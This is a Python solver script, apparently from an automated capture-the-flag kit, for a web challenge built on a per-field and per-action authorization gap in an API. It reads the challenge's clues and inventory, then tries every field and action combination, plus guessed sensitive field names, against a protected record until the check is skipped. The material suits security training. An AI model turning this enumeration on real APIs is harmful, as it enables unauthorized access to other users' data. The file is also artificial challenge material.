"""D24 "The API Has Opinions" (web-exploitation-day-14-the-api-has-opinions): per-field/action (BOLA/BFLA) authz gap.

Kit shape: /api/clues = {framework, feature_route, inventory_route, current_role, protected_reference}; GET
inventory_route -> {route, query_parameters:[id,fields,action], fields:[..], actions:[..], public_reference, sample};
GET route?id=<protected_reference>&fields=<f>&action=<a> -> 403 field_action_forbidden for most combos, but one
(field, action) pair (single: note+export) skips the check -> {"effect":"api_field_action_authorization_bypassed",
"evidence":"proof_.."}. Try every single field x action from the inventory. Re-runnable on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve


def _j(body):
    try:
        return json.loads(body or "")
    except Exception:
        return {}


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    inv_route = next((v for k, v in cl.items() if re.search(r"inventory", k, re.I) and isinstance(v, str)), None)
    inv = _j(websolve.fetch(urllib.parse.urljoin(base, inv_route))[1]) if inv_route else {}
    route = inv.get("route") or cl.get("feature_route")
    if not route:
        return None
    ref = next((v for k, v in cl.items() if re.search(r"protected|private|target_ref|reference", k, re.I)
                and not re.search(r"public", k, re.I) and isinstance(v, (int, str))), None)
    if ref is None:
        return None
    params = inv.get("query_parameters") or ["id", "fields", "action"]
    idp = next((p for p in params if re.search(r"id", p, re.I)), "id")
    fp = next((p for p in params if re.search(r"field", p, re.I)), "fields")
    ap = next((p for p in params if re.search(r"action|op|verb", p, re.I)), "action")
    fields = list(inv.get("fields") or ["note", "title"])
    actions = list(inv.get("actions") or ["export", "view"])
    url = urllib.parse.urljoin(base, route)
    # inventory's own fields first (sensitive ones usually listed last), then a few generic sensitive names
    combos = [(f, a) for a in reversed(actions) for f in reversed(fields)]
    combos += [(",".join(fields), a) for a in actions if len(fields) > 1]
    combos += [(f, a) for f in ("note", "secret", "proof", "objective") if f not in fields for a in actions]
    for f, a in combos:
        q = urllib.parse.urlencode({idp: ref, fp: f, ap: a})
        p = websolve.proof(websolve.fetch(url + "?" + q)[1])
        if p:
            return p
    return None


KEY_MAP = [(r"inventory_route|protected_reference", "day24_web_the_api_has_opinions")]
HANDLERS = {"day24_web_the_api_has_opinions": exploit}
